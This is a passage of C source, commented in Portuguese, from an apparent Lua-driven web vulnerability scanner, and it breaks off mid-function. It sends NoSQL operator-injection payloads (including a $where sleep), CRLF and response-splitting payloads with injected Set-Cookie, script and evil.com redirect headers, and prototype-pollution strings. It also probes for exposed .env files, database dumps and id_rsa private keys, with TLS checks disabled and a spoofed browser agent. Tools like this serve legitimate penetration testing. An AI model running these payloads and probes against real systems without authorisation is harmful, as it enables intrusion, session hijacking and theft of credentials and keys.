/* ── Helper: faz request e retorna body + code ───────────────────────── */
static int nosql_fetch_get(const char *url, char *out, size_t outsz, long *code) {
    *code=0; if(out&&outsz) out[0]='\0';
    CURL *ch=curl_easy_init(); if(!ch) return 0;
    CurlBuf cb={NULL,0}; cb.data=malloc(65536);
    if(!cb.data){curl_easy_cleanup(ch);return 0;}
    curl_easy_setopt(ch,CURLOPT_URL,           url);
    curl_easy_setopt(ch,CURLOPT_WRITEFUNCTION, curl_write_cb);
    curl_easy_setopt(ch,CURLOPT_WRITEDATA,     &cb);
    curl_easy_setopt(ch,CURLOPT_TIMEOUT,       8L);
    curl_easy_setopt(ch,CURLOPT_CONNECTTIMEOUT,5L);
    curl_easy_setopt(ch,CURLOPT_SSL_VERIFYPEER,0L);
    curl_easy_setopt(ch,CURLOPT_FOLLOWLOCATION,1L);
    curl_easy_setopt(ch,CURLOPT_USERAGENT,     "Mozilla/5.0 (Windows NT 10.0; Win64; x64)");
    CURLcode rc=curl_easy_perform(ch);
    curl_easy_getinfo(ch,CURLINFO_RESPONSE_CODE,code);
    curl_easy_cleanup(ch);
    if(rc==CURLE_OK && cb.data && cb.size>0) {
        size_t cp=cb.size<outsz-1?cb.size:outsz-1;
        memcpy(out,cb.data,cp); out[cp]='\0';
    }
    int ok=(rc==CURLE_OK);
    free(cb.data);
    return ok;
}

static int nosql_fetch_post(const char *url, const char *json_body,
                            char *out, size_t outsz, long *code) {
    *code=0; if(out&&outsz) out[0]='\0';
    CURL *ch=curl_easy_init(); if(!ch) return 0;
    CurlBuf cb={NULL,0}; cb.data=malloc(65536);
    if(!cb.data){curl_easy_cleanup(ch);return 0;}
    struct curl_slist *hdrs=NULL;
    hdrs=curl_slist_append(hdrs,"Content-Type: application/json");
    hdrs=curl_slist_append(hdrs,"Accept: application/json, text/html, */*");
    curl_easy_setopt(ch,CURLOPT_URL,           url);
    curl_easy_setopt(ch,CURLOPT_POSTFIELDS,    json_body);
    curl_easy_setopt(ch,CURLOPT_HTTPHEADER,    hdrs);
    curl_easy_setopt(ch,CURLOPT_WRITEFUNCTION, curl_write_cb);
    curl_easy_setopt(ch,CURLOPT_WRITEDATA,     &cb);
    curl_easy_setopt(ch,CURLOPT_TIMEOUT,       8L);
    curl_easy_setopt(ch,CURLOPT_CONNECTTIMEOUT,5L);
    curl_easy_setopt(ch,CURLOPT_SSL_VERIFYPEER,0L);
    curl_easy_setopt(ch,CURLOPT_FOLLOWLOCATION,1L);
    curl_easy_setopt(ch,CURLOPT_USERAGENT,     "Mozilla/5.0 (Windows NT 10.0; Win64; x64)");
    CURLcode rc=curl_easy_perform(ch);
    curl_easy_getinfo(ch,CURLINFO_RESPONSE_CODE,code);
    curl_slist_free_all(hdrs);
    curl_easy_cleanup(ch);
    if(rc==CURLE_OK && cb.data && cb.size>0) {
        size_t cp=cb.size<outsz-1?cb.size:outsz-1;
        memcpy(out,cb.data,cp); out[cp]='\0';
    }
    int ok=(rc==CURLE_OK);
    free(cb.data);
    return ok;
}

/* ══════════════════════════════════════════════════════════════════
 * nosql_analyze — analisa sinais de NoSQL Injection
 *
 * Retorna:
 *  -1  BLOCKED/INCONCLUSIVE: baseline ou payload bloqueado por WAF/servidor
 *   0  sem evidência
 *   1  SUSPEITO
 *   2  PROVÁVEL
 *   3  CONFIRMADO
 *
 * Regra fundamental: 403/429 no baseline → resultado inútil → -1.
 * Nunca confirma injeção baseado em bloqueio de WAF.
 * ══════════════════════════════════════════════════════════════════ */
static int nosql_analyze(const char *body, size_t bsz,
                         long code, long base_code,
                         size_t base_sz, size_t false_sz,
                         const char **reason_out) {

    /* ── GUARD 0: baseline bloqueado → comparação inútil ──────────── */
    /* Se o servidor já bloqueia requests normais, qualquer diferença
     * no payload é ruído de WAF, não evidência de NoSQLi.            */
    if(base_code==403||base_code==401||base_code==429||
       (base_code>=400&&base_code<500&&base_code!=400)) {
        *reason_out="baseline-blocked"; return -1;
    }

    /* ── GUARD 1: payload também bloqueado → BLOCKED, não CONFIRMED ─ */
    if(code==403||code==429) {
        *reason_out="payload-blocked"; return -1;
    }

    /* ── GUARD 2: resposta é WAF/challenge → não analisa ─────────── */
    if(resp_waf_classify(body, bsz, code) >= RBLK_BLOCK) {
        *reason_out="waf-response"; return -1;
    }

    /* ── Sinal forte: erro REAL de banco NoSQL no body ─────────────
     * Só verificado quando o código indica resposta da aplicação     */
    if(code==200||code==500||code==400) {
        for(int e=0; g_nosql_errors[e]; e++) {
            if(buf_icontains(body, bsz, g_nosql_errors[e])) {
                *reason_out="error-based"; return 3;
            }
        }
    }

    /* ── Sinal forte: bypass retornou 200, baseline retornou sucesso─
     * Só válido quando baseline era um código "normal" (<400)        */
    if(code==200 && base_code!=200 && base_code<400) {
        *reason_out="status-bypass"; return 3;
    }

    /* ── Boolean diff: payload retornou MUITO mais que false baseline
     * Só válido quando TODOS os requests retornam 200 (app normal)   */
    if(code==200 && base_code==200 && bsz>0 && false_sz>0 && base_sz>0) {
        long diff=(long)bsz-(long)false_sz;
        double pct=false_sz>0?(double)diff/(double)false_sz:0.0;
        /* Limiar conservador: >15% e >200 bytes */
        if(diff>200 && pct>0.15 && bsz>base_sz) {
            *reason_out="boolean-diff"; return 2;
        }
    }

    /* ── HTTP 500 com operador injetado, baseline era 200 ─────────── */
    if(code==500 && base_code==200) {
        *reason_out="http500-operator"; return 2;
    }

    /* ── Data-leak: body muito maior que baseline (200→200 apenas) ── */
    if(code==200 && base_code==200 && bsz > base_sz+500) {
        *reason_out="data-leak"; return 2;
    }

    return 0;
}

static int l_mod_nosql(lua_State *L) {
    const char *raw_url = luaL_checkstring(L, 1);

    /* Separa base da query */
    char base[512]={0};
    const char *qm=strchr(raw_url,'?');
    size_t blen_base=qm?(size_t)(qm-raw_url):strlen(raw_url);
    if(blen_base<sizeof(base)){memcpy(base,raw_url,blen_base);base[blen_base]='\0';}

    /* Extrai primeiro parâmetro da URL (padrão: "id") */
    char param[128]="id";
    if(qm) {
        const char *eq=strchr(qm+1,'=');
        if(eq) {
            size_t plen=(size_t)(eq-(qm+1));
            if(plen<sizeof(param)){memcpy(param,qm+1,plen);param[plen]='\0';}
        }
    }

    printf("\n\033[1;35m╔══════════════════════════════════════════════════════════════╗\033[0m\n");
    printf("\033[1;35m║  mod.nosql — NoSQL Injection Scanner v2                      ║\033[0m\n");
    printf("\033[1;35m╚══════════════════════════════════════════════════════════════╝\033[0m\n\n");
    printf("\033[1;33m[*]\033[0m Target : %s\n", base);
    printf("\033[1;33m[*]\033[0m Param  : %s\n", param);
    printf("\033[1;33m[*]\033[0m Modos  : GET operator injection + POST JSON\n\n");

    /* ── Baseline GET (valor benigno) ──────────────────────────────────── */
    char url_base[1024]; snprintf(url_base,sizeof(url_base),"%s?%s=1",base,param);
    char body_base[65536]={0}; long code_base=0;
    nosql_fetch_get(url_base, body_base, sizeof(body_base), &code_base);
    size_t sz_base=strlen(body_base);

    /* FALSE baseline GET (valor que não deve retornar nada) */
    char url_false[1024]; snprintf(url_false,sizeof(url_false),"%s?%s=__NOSQL_FALSE_9z9__",base,param);
    char body_false[65536]={0}; long code_false=0;
    nosql_fetch_get(url_false, body_false, sizeof(body_false), &code_false);
    size_t sz_false=strlen(body_false);

    /* Baseline POST JSON (body benigno) */
    char body_post_base[65536]={0}; long code_post_base=0;
    char json_base[256]; snprintf(json_base,sizeof(json_base),"{\"%s\":\"__FALSE__\"}",param);
    nosql_fetch_post(base, json_base, body_post_base, sizeof(body_post_base), &code_post_base);
    size_t sz_post_base=strlen(body_post_base);

    /* FALSE POST (operador que sempre falha) para boolean diff */
    char body_post_false[65536]={0}; long code_post_false=0;
    char json_never[256]; snprintf(json_never,sizeof(json_never),"{\"%s\":{\"$eq\":\"__NEVER_9z9__\"}}",param);
    nosql_fetch_post(base, json_never, body_post_false, sizeof(body_post_false), &code_post_false);
    size_t sz_post_false=strlen(body_post_false);

    printf("\033[0;90m  baseline GET  : HTTP %ld  %zu bytes\033[0m\n", code_base, sz_base);
    printf("\033[0;90m  false GET     : HTTP %ld  %zu bytes\033[0m\n", code_false, sz_false);
    printf("\033[0;90m  baseline POST : HTTP %ld  %zu bytes\033[0m\n\n", code_post_base, sz_post_base);

    /* ══ GUARD: baseline bloqueado → scan inconcluso ════════════════════
     * Se o servidor rejeita requests normais com 4xx, qualquer diferença
     * observada nos payloads é ruído do WAF, não evidência de NoSQLi.    */
    if(code_base>=400 || code_post_base>=400) {
        int wt = resp_waf_classify(body_base, sz_base, code_base);
        const char *wname = (wt>=RBLK_CF_JS)?"Cloudflare/CDN challenge"
                          : (wt>=RBLK_BLOCK)?"WAF/Firewall"
                          :                   "Servidor (HTTP 4xx)";
        printf("\033[1;33m\n  [!] Baseline bloqueado — HTTP %ld (GET) / HTTP %ld (POST)\033[0m\n",
               code_base, code_post_base);
        printf("\033[1;33m  [!] Tipo detectado : %s\033[0m\n", wname);
        printf("\033[0;33m  [*] Sem baseline válido, NoSQL injection não pode ser confirmada.\033[0m\n");
        printf("\033[0;33m  [*] Status: INCONCLUSIVE / BLOCKED\033[0m\n\n");
        printf("\033[1m┌─────────────────────────────────────────────┐\033[0m\n");
        printf("\033[1m│  NoSQL Injection                            │\033[0m\n");
        printf("\033[1m│  Target  : %-32.32s│\033[0m\n", base);
        printf("\033[1m│  Param   : %-32.32s│\033[0m\n", param);
        printf("\033[1;33m│  ⚠ INCONCLUSIVE/BLOCKED — baseline HTTP %ld %-4s│\033[0m\n",
               code_base, "");
        printf("\033[1m└─────────────────────────────────────────────┘\033[0m\n\n");
        lua_pushinteger(L,0); return 1;
    }

    int found=0;
    const char *conf_labels[]={"","○ SUSPEITO","⚠ PROVÁVEL","❌ CONFIRMADO"};
    const char *conf_colors[]={ "", "\033[0;33m", "\033[1;33m", "\033[1;31m" };

    /* ══ FASE 0 — REGEX injection (MongoDB $regex, $where, $in) ═════════════════
     * Detecta se o backend aceita operadores NoSQL refletidos no resultado. */
    printf("\033[1;36m[FASE 0] Regex + operator injection avancado\033[0m\n");
    {
        /* Constrói JSONs dinamicamente com snprintf para evitar problemas de escape */
        typedef struct { const char *desc; char body[256]; } NoSqlExtra;
        NoSqlExtra regex_tests[9];
        memset(regex_tests,0,sizeof(regex_tests));
        int nrt=0;

        /* regex-all: {"param":{"$regex":".*"}} */
        regex_tests[nrt].desc="regex-all";
        snprintf(regex_tests[nrt].body,255,
                 "{\"%s\":{\"\\$regex\":\".*\"}}",param); nrt++;
        /* regex-alpha: {"param":{"$regex":"^[a-z]"}} */
        regex_tests[nrt].desc="regex-alpha";
        snprintf(regex_tests[nrt].body,255,
                 "{\"%s\":{\"\\$regex\":\"^[a-z]\"}}",param); nrt++;
        /* where-true */
        regex_tests[nrt].desc="where-true";
        snprintf(regex_tests[nrt].body,255,
                 "{\"%s\":{\"\\$where\":\"1==1\"}}",param); nrt++;
        /* where-sleep */
        regex_tests[nrt].desc="where-sleep";
        snprintf(regex_tests[nrt].body,255,
                 "{\"%s\":{\"\\$where\":\"sleep(100)||1==1\"}}",param); nrt++;
        /* in-array */
        regex_tests[nrt].desc="in-array";
        snprintf(regex_tests[nrt].body,255,
                 "{\"%s\":{\"\\$in\":[\"admin\",\"user\",\"root\",\"test\"]}}",param); nrt++;
        /* nin-empty */
        regex_tests[nrt].desc="nin-empty";
        snprintf(regex_tests[nrt].body,255,
                 "{\"%s\":{\"\\$nin\":[]}}",param); nrt++;
        /* exists-true */
        regex_tests[nrt].desc="exists-true";
        snprintf(regex_tests[nrt].body,255,
                 "{\"%s\":{\"\\$exists\":true}}",param); nrt++;
        /* type-string */
        regex_tests[nrt].desc="type-string";
        snprintf(regex_tests[nrt].body,255,
                 "{\"%s\":{\"\\$type\":2}}",param); nrt++;
        regex_tests[nrt].desc=NULL;

        for(int ri=0; ri<nrt; ri++) {
            char rbody[65536]={0}; long rcode=0;
            if(!nosql_fetch_post(base, regex_tests[ri].body, rbody, sizeof(rbody), &rcode)) continue;
            size_t rsz=strlen(rbody);
            const char *reason="";
            int conf=nosql_analyze(rbody,rsz,rcode,code_post_base,sz_post_base,sz_post_false,&reason);
            if(conf==-1) continue; /* BLOCKED/INCONCLUSIVE — WAF/baseline inválido */
            if(conf>=2) {
                printf("%s  [NoSQLi/REGEX/%s] %s  HTTP %ld  [%s]\033[0m\n",
                       conf_colors[conf],regex_tests[ri].desc,conf_labels[conf],rcode,reason);
                char ev[256]; snprintf(ev,255,"regex body=%s reason=%s",regex_tests[ri].desc,reason);
                vuln_register("NoSQLi",base,regex_tests[ri].body,ev,conf,conf*30);
                found++;
            } else if(conf==1) {
                printf("\033[0;90m  [?] suspeito REGEX/%s  HTTP %ld\033[0m\n",regex_tests[ri].desc,rcode);
            }
        }
    }
    printf("\n");



    /* ════════════════════════════════════════════════════════════════════
     * FASE 1 — GET operator injection
     * ════════════════════════════════════════════════════════════════════ */
    printf("\033[1;36m[FASE 1] GET — operator injection\033[0m\n");
    for(int i=0; g_nosql_get[i].suffix; i++) {
        char url[1024];
        snprintf(url,sizeof(url),"%s?%s%s",base,param,g_nosql_get[i].suffix);
        char body[65536]={0}; long code=0;
        if(!nosql_fetch_get(url, body, sizeof(body), &code)) continue;
        size_t sz=strlen(body);
        const char *reason="";
        int conf=nosql_analyze(body,sz,code,code_base,sz_base,sz_false,&reason);
        if(conf==-1) continue; /* BLOCKED/INCONCLUSIVE */
        if(conf>=2) {
            printf("%s  [NoSQLi/GET/%s] %s  HTTP %ld  [%s]\033[0m\n",
                   conf_colors[conf], g_nosql_get[i].desc,
                   conf_labels[conf], code, reason);
            printf("     → %s\n", url);
            char ev[256]; snprintf(ev,sizeof(ev),"GET param=%s%s reason=%s",
                                   param,g_nosql_get[i].suffix,reason);
            vuln_register("NoSQLi",base,url,ev,conf,conf*30);
            found++;
        } else if(conf==1) {
            printf("\033[0;90m  [?] suspeito GET/%s  HTTP %ld\033[0m\n",
                   g_nosql_get[i].desc, code);
        }
    }

    /* ════════════════════════════════════════════════════════════════════
     * FASE 2 — POST JSON injection
     * ════════════════════════════════════════════════════════════════════ */
    printf("\n\033[1;36m[FASE 2] POST — JSON body injection\033[0m\n");

    for(int i=0; g_nosql_post[i].body; i++) {
        char body[65536]={0}; long code=0;
        if(!nosql_fetch_post(base, g_nosql_post[i].body, body, sizeof(body), &code)) continue;
        size_t sz=strlen(body);
        const char *reason="";
        int conf=nosql_analyze(body,sz,code,code_post_base,
                               sz_post_base,sz_post_false,&reason);
        if(conf==-1) continue; /* BLOCKED/INCONCLUSIVE */
        if(conf>=2) {
            printf("%s  [NoSQLi/POST/%s] %s  HTTP %ld  [%s]\033[0m\n",
                   conf_colors[conf], g_nosql_post[i].desc,
                   conf_labels[conf], code, reason);
            printf("     → body: %s\n", g_nosql_post[i].body);
            char ev[512]; snprintf(ev,sizeof(ev),"POST body=%s reason=%s",
                                   g_nosql_post[i].desc, reason);
            vuln_register("NoSQLi",base,g_nosql_post[i].body,ev,conf,conf*30);
            found++;
        } else if(conf==1) {
            printf("\033[0;90m  [?] suspeito POST/%s  HTTP %ld\033[0m\n",
                   g_nosql_post[i].desc, code);
        }
    }

    /* ── Sumário ──────────────────────────────────────────────────────── */
    printf("\n\033[1m┌─────────────────────────────────────────────┐\033[0m\n");
    printf("\033[1m│  NoSQL Injection                            │\033[0m\n");
    printf("\033[1m│  Target  : %-32.32s│\033[0m\n", base);
    printf("\033[1m│  Param   : %-32.32s│\033[0m\n", param);
    if(found>0)
        printf("\033[1;31m│  ❌ VULNERÁVEL — %d hit(s)%-17s│\033[0m\n",found,"");
    else
        printf("\033[1;32m│  ✅ Sem NoSQL injection detectado           │\033[0m\n");
    printf("\033[1m└─────────────────────────────────────────────┘\033[0m\n\n");

    lua_pushinteger(L,found); return 1;
}

// ============================================================================
// MOD.BACKUP — Testa extensões de backup e arquivos esquecidos
// mod.backup(url)
// Testa: .bak, .old, .orig, .swp, ~, .tar.gz, .zip, .sql, etc.
// ============================================================================
static int l_mod_backup(lua_State *L) {
    const char *raw_url = luaL_checkstring(L, 1);

    /* Extrai base sem query e sem extensão */
    char base[512]={0};
    const char *qm=strchr(raw_url,'?');
    size_t blen_base=qm?(size_t)(qm-raw_url):strlen(raw_url);
    if(blen_base<sizeof(base)){memcpy(base,raw_url,blen_base);base[blen_base]='\0';}
    /* Remove trailing slash */
    size_t bl=strlen(base); while(bl>8&&base[bl-1]=='/') base[--bl]='\0';

    /* Extrai nome do arquivo (última parte do path) */
    char filename[256]={0};
    const char *last_slash=strrchr(base,'/');
    if(last_slash&&strlen(last_slash)>1) snprintf(filename,sizeof(filename),"%s",last_slash+1);

    printf("\n\033[1;35m╔══════════════════════════════════════════════════════════════╗\033[0m\n");
    printf("\033[1;35m║  mod.backup — Backup File Scanner                            ║\033[0m\n");
    printf("\033[1;35m╚══════════════════════════════════════════════════════════════╝\033[0m\n\n");
    printf("\033[1;33m[*]\033[0m Target: %s\n\n", base);

    /* Gera lista de URLs para testar */
    char *targets[256]={0}; int tn=0;
    char tmp[1024];

    /* Extensões de backup direto no arquivo */
    const char *exts[]={".bak",".old",".orig",".backup",".copy",".tmp",
                        ".swp",".swo","~",".1",".2",".bkp",".save",NULL};
    for(int e=0;exts[e]&&tn<200;e++) {
        snprintf(tmp,sizeof(tmp),"%s%s",base,exts[e]);
        targets[tn++]=strdup(tmp);
    }

    /* Arquivos comuns no mesmo diretório */
    char dir[512]={0};
    const char *ls=strrchr(base,'/');
    if(ls) { size_t dl=(size_t)(ls-base)+1; if(dl<sizeof(dir)){memcpy(dir,base,dl);dir[dl]='\0';} }
    else snprintf(dir,sizeof(dir),"%s/",base);

    const char *common_files[]={
        "backup.zip","backup.tar.gz","backup.sql","dump.sql","db.sql",
        "site.zip","www.zip","html.zip","public.zip","files.zip",
        ".env",".env.bak",".env.old","config.bak","config.php.bak",
        "wp-config.php.bak","settings.py.bak","database.yml.bak",
        "id_rsa","id_rsa.pub","id_dsa",".ssh/id_rsa",
        NULL
    };
    for(int c=0;common_files[c]&&tn<256;c++) {
        snprintf(tmp,sizeof(tmp),"%s%s",dir,common_files[c]);
        targets[tn++]=strdup(tmp);
    }

    /* Se tem filename, testa variações */
    if(filename[0]) {
        /* Remove extensão original */
        char fname_noext[256]={0};
        snprintf(fname_noext,sizeof(fname_noext),"%s",filename);
        char *dot=strrchr(fname_noext,'.');
        if(dot) *dot='\0';

        const char *fname_exts[]={".php.bak",".php~",".php.old",".bak",".orig",NULL};
        for(int e=0;fname_exts[e]&&tn<256;e++) {
            snprintf(tmp,sizeof(tmp),"%s%s%s",dir,fname_noext,fname_exts[e]);
            targets[tn++]=strdup(tmp);
        }
    }

    int found=0;
    CURL *ch=curl_easy_init();
    if(!ch) { for(int i=0;i<tn;i++)free(targets[i]); lua_pushinteger(L,0); return 1; }

    for(int i=0;i<tn;i++) {
        CurlBuf cb={NULL,0}; cb.data=malloc(512); if(cb.data) cb.data[0]='\0';
        curl_easy_reset(ch);
        curl_easy_setopt(ch,CURLOPT_URL,targets[i]);
        curl_easy_setopt(ch,CURLOPT_WRITEFUNCTION,curl_write_cb);
        curl_easy_setopt(ch,CURLOPT_WRITEDATA,&cb);
        curl_easy_setopt(ch,CURLOPT_TIMEOUT,8L);
        curl_easy_setopt(ch,CURLOPT_CONNECTTIMEOUT,3L);
        curl_easy_setopt(ch,CURLOPT_SSL_VERIFYPEER,0L);
        curl_easy_setopt(ch,CURLOPT_FOLLOWLOCATION,0L);
        curl_easy_setopt(ch,CURLOPT_NOBODY,0L);
        curl_easy_setopt(ch,CURLOPT_USERAGENT,"Mozilla/5.0");
        CURLcode rc=curl_easy_perform(ch);
        long code=0; curl_easy_getinfo(ch,CURLINFO_RESPONSE_CODE,&code);
        free(cb.data);

        if(rc==CURLE_OK && (code==200||code==206||code==301||code==302)) {
            const char *label = (code==200)?"✓ EXISTE":"→ REDIRECT";
            printf("\033[1;31m  [%s] HTTP %ld  %s\033[0m\n",label,code,targets[i]);
            char ld[256]={0}; snprintf(ld,sizeof(ld),"file=%s HTTP=%ld",targets[i],code);
            elliot_log("BACKUP",targets[i],ld);
            found++;
        }
        free(targets[i]);
    }

    curl_easy_cleanup(ch);
    if(!found) printf("\033[1;32m  [✓] Nenhum arquivo de backup encontrado\033[0m\n");
    printf("\n\033[1;33m[*]\033[0m %d arquivo(s) de backup encontrado(s)\n\n",found);
    lua_pushinteger(L,found); return 1;
}

// ============================================================================
// MOD.CRLF — CRLF Injection
// mod.crlf(url)
// Injeta \r\n nos parâmetros para separar headers HTTP
// Detecta: header injection, log injection, response splitting
// ============================================================================
/* ─── CRLF Injection payloads v2 ───────────────────────────────────────────
 * Cobre: header injection, cookie injection, response splitting, log injection,
 * redirect injection, double-encoding, URL-encoded variants, path-based CRLF.
 * ─────────────────────────────────────────────────────────────────────────── */
static const char *g_crlf_payloads[] = {
    /* ── clássicos %0d%0a ────────────────────────────────────────────── */
    "%0d%0aX-Injected:crlf",
    "%0aX-Injected:crlf",
    "%0d%0a%20X-Injected:crlf",
    "%0d%0a\tX-Injected:crlf",
    /* ── header injection uteis ──────────────────────────────────────── */
    "%0d%0aSet-Cookie:crlf=injected;Path=/",
    "%0d%0aSet-Cookie:session=hijacked;HttpOnly",
    "%0d%0aLocation:https://evil.com",
    "%0d%0aContent-Type:text/html",
    "%0d%0aX-XSS-Protection:0",
    "%0d%0aAccess-Control-Allow-Origin:*",
    "%0d%0aContent-Security-Policy:default-src *",
    /* ── response splitting ───────────────────────────────────────────── */
    "%0d%0aContent-Length:0%0d%0a%0d%0a<html>injected</html>",
    "%0d%0aContent-Length:0%0d%0aHTTP/1.1 200 OK%0d%0aContent-Type:text/html%0d%0a%0d%0a<script>alert(1)</script>",
    /* ── double encoding ─────────────────────────────────────────────── */
    "%250d%250aX-Injected:crlf",
    "%25%30%64%25%30%61X-Injected:crlf",
    "%0d%25%30%61X-Injected:crlf",
    /* ── unicode / fullwidth newline ──────────────────────────────────── */
    "%u000aX-Injected:crlf",
    "%u000d%u000aX-Injected:crlf",
    "\\u000d\\u000aX-Injected:crlf",
    /* ── prefixed payloads ────────────────────────────────────────────── */
    "#%0d%0aX-Injected:crlf",          /* # + CRLF */
    "?%0d%0aX-Injected:crlf",          /* ? + CRLF */
    "/%0d%0aX-Injected:crlf",          /* / + CRLF */
    "crlf%0d%0aX-Injected:crlf",
    "test%0d%0aX-Injected:crlf%0d%0a",
    /* ── path-based ──────────────────────────────────────────────────── */
    "%0d%0aX-Injected:crlf%0d%0a",
    "foo%0d%0abar%0d%0aX-Injected:crlf",
    /* ── literal CR/LF ───────────────────────────────────────────────── */
    "\r\nX-Injected:crlf",
    "\nX-Injected:crlf",
    "\r\nSet-Cookie:crlf=injected",
    "\r\nLocation:https://evil.com",
    NULL
};
#define CRLF_PAYLOADS_COUNT 32

static int l_mod_crlf(lua_State *L) {
    const char *raw_url = luaL_checkstring(L, 1);

    /* Extrai base e parâmetro alvo */
    char base[512]={0}; char param[64]="q";
    const char *qm=strchr(raw_url,'?');
    size_t blen_base=qm?(size_t)(qm-raw_url):strlen(raw_url);
    if(blen_base<sizeof(base)){memcpy(base,raw_url,blen_base);base[blen_base]='\0';}
    if(qm) {
        const char *eq=strchr(qm+1,'=');
        if(eq){size_t pl=(size_t)(eq-(qm+1));if(pl<sizeof(param)){memcpy(param,qm+1,pl);param[pl]='\0';}}
    }

    printf("\n\033[1;35m╔══════════════════════════════════════════════════════════════╗\033[0m\n");
    printf("\033[1;35m║  mod.crlf — CRLF Injection Scanner                           ║\033[0m\n");
    printf("\033[1;35m╚══════════════════════════════════════════════════════════════╝\033[0m\n\n");
    printf("\033[1;33m[*]\033[0m Target: %s  param: %s\n\n", base, param);

    int found=0;
    CURL *ch=curl_easy_init();
    if(!ch){lua_pushinteger(L,0);return 1;}

    for(int i=0;i<CRLF_PAYLOADS_COUNT&&g_crlf_payloads[i];i++) {
        char url[1024]; snprintf(url,sizeof(url),"%s?%s=%s",base,param,g_crlf_payloads[i]);

        /* Captura HEADERS da resposta para detectar injeção */
        CurlBuf cb={NULL,0}; cb.data=malloc(8192); if(cb.data) cb.data[0]='\0';
        curl_easy_reset(ch);
        curl_easy_setopt(ch,CURLOPT_URL,url);
        curl_easy_setopt(ch,CURLOPT_WRITEFUNCTION,curl_write_cb);
        curl_easy_setopt(ch,CURLOPT_WRITEDATA,&cb);
        curl_easy_setopt(ch,CURLOPT_HEADER,1L);  /* headers no body para checar */
        curl_easy_setopt(ch,CURLOPT_TIMEOUT,8L);
        curl_easy_setopt(ch,CURLOPT_CONNECTTIMEOUT,4L);
        curl_easy_setopt(ch,CURLOPT_SSL_VERIFYPEER,0L);
        curl_easy_setopt(ch,CURLOPT_FOLLOWLOCATION,0L); /* sem redirect — detectamos Location injetado */
        curl_easy_setopt(ch,CURLOPT_USERAGENT,"Mozilla/5.0");
        CURLcode rc=curl_easy_perform(ch);
        long code=0; curl_easy_getinfo(ch,CURLINFO_RESPONSE_CODE,&code);

        if(rc==CURLE_OK && cb.data && cb.size>0) {
            int confirmed=0; const char *reason="";
            /* Verifica se o header X-Injected aparece na resposta */
            if(buf_icontains(cb.data,cb.size,"X-Injected: crlf")||
               buf_icontains(cb.data,cb.size,"X-Injected:crlf")) {
                confirmed=1; reason="header-injected";
            }
            /* Set-Cookie injetado */
            if(!confirmed && buf_icontains(cb.data,cb.size,"Set-Cookie: crlf=injected")) {
                confirmed=1; reason="cookie-injected";
            }
            /* Location injetado para evil.com */
            if(!confirmed && buf_icontains(cb.data,cb.size,"Location: https://evil.com")) {
                confirmed=1; reason="redirect-injected";
            }
            /* Response splitting — Content-Length:0 + duplo CRLF */
            if(!confirmed && buf_icontains(cb.data,cb.size,"Content-Length: 0\r\n\r\n")) {
                confirmed=1; reason="response-split";
            }

            if(confirmed) {
                printf("\033[1;31m  [✓ CRLF/%s] HTTP %ld  %s\033[0m\n",reason,code,g_crlf_payloads[i]);
                char ld[256]={0}; snprintf(ld,sizeof(ld),"payload=%s reason=%s",g_crlf_payloads[i],reason);
                elliot_log("CRLF",base,ld);
                found++;
            }
        }
        free(cb.data);
    }

    curl_easy_cleanup(ch);
    if(!found) printf("\033[1;32m  [✓] Sem CRLF injection detectado\033[0m\n");
    printf("\n\033[1;33m[*]\033[0m %d CRLF injection(s) encontrado(s)\n\n",found);
    lua_pushinteger(L,found); return 1;
}

// ============================================================================
// MOD.PROTOTYPE — Prototype Pollution Scanner
// mod.prototype(url)
// Detecta: GET param pollution, POST JSON __proto__, constructor.prototype
// Técnicas: body diff, error-based, status diff, reflected payload
// ============================================================================
static int l_mod_prototype(lua_State *L) {
    const char *raw_url = luaL_checkstring(L, 1);
    char base[512]={0};
    const char *qm=strchr(raw_url,'?');
    size_t blen=qm?(size_t)(qm-raw_url):strlen(raw_url);
    if(blen<sizeof(base)){memcpy(base,raw_url,blen);base[blen]='\0';}

    /* Extrai param se existir */
    char param[64]="q";
    if(qm){const char *eq=strchr(qm+1,'=');if(eq){size_t pl=(size_t)(eq-(qm+1));if(pl<sizeof(param)){memcpy(param,qm+1,pl);param[pl]='\0';}}}

    MOD_RESET();
    printf("\n\033[1;35m╔═══════════════════════════════════════════════════════════════╗\033[0m\n");
    printf("\033[1;35m║  mod.prototype — Prototype Pollution Scanner v1               ║\033[0m\n");
    printf("\033[1;35m╚═══════════════════════════════════════════════════════════════╝\033[0m\n\n");
    printf("\033[1;33m[*] Target: %s\033[0m\n\n", base);

    /* Baseline GET */
    char url_base[1024]; snprintf(url_base,sizeof(url_base),"%s?%s=normal",base,param);
    char body_base[65536]={0}; long code_base=0;
    {CURL *ch=curl_easy_init();if(ch){WorkBuf wb={0};wb.buf=malloc(65536);wb.cap=65536;
        curl_easy_setopt(ch,CURLOPT_URL,url_base);curl_easy_setopt(ch,CURLOPT_WRITEFUNCTION,worker_write_cb);
        curl_easy_setopt(ch,CURLOPT_WRITEDATA,&wb);curl_easy_setopt(ch,CURLOPT_TIMEOUT,8L);
        curl_easy_setopt(ch,CURLOPT_SSL_VERIFYPEER,0L);curl_easy_setopt(ch,CURLOPT_FOLLOWLOCATION,1L);
        curl_easy_setopt(ch,CURLOPT_USERAGENT,"Mozilla/5.0");curl_easy_perform(ch);
        curl_easy_getinfo(ch,CURLINFO_RESPONSE_CODE,&code_base);
        if(wb.buf&&wb.len>0&&wb.len<65535){memcpy(body_base,wb.buf,wb.len);}
        curl_easy_cleanup(ch);free(wb.buf);}}

    int found=0;
    printf("\033[1;36m[FASE 1] GET — query string pollution\033[0m\n");

    /* Payloads GET para Prototype Pollution */
    typedef struct { const char *desc; const char *suffix; } ProtoTest;
    ProtoTest get_tests[] = {
        {"__proto__[test]",        "__proto__[test]=pp_marker"},
        {"__proto__.test",         "__proto__[polluted]=1"},
        {"constructor[proto]",     "constructor[prototype][pp]=1"},
        {"__proto__[toString]",    "__proto__[toString]=pp_marker"},
        {"__proto__[hasOwnProp]",  "__proto__[hasOwnProperty]=pp_marker"},
        {"constructor.proto.test", "constructor.prototype.test=pp_marker"},
        {"a[__proto__]",           "a[__proto__][pp]=1"},
        {NULL, NULL}
    };

    for(int i=0; get_tests[i].desc; i++) {
        char url[1024]; snprintf(url,sizeof(url),"%s?%s=%s&%s",
            base,param,"normal",get_tests[i].suffix);

        CURL *ch=curl_easy_init(); if(!ch) continue;
        WorkBuf wb={0}; wb.buf=malloc(65536); wb.cap=65536;
        curl_easy_setopt(ch,CURLOPT_URL,url);
        curl_easy_setopt(ch,CURLOPT_WRITEFUNCTION,worker_write_cb);
        curl_easy_setopt(ch,CURLOPT_WRITEDATA,&wb);
        curl_easy_setopt(ch,CURLOPT_TIMEOUT,8L);
        curl_easy_setopt(ch,CURLOPT_SSL_VERIFYPEER,0L);
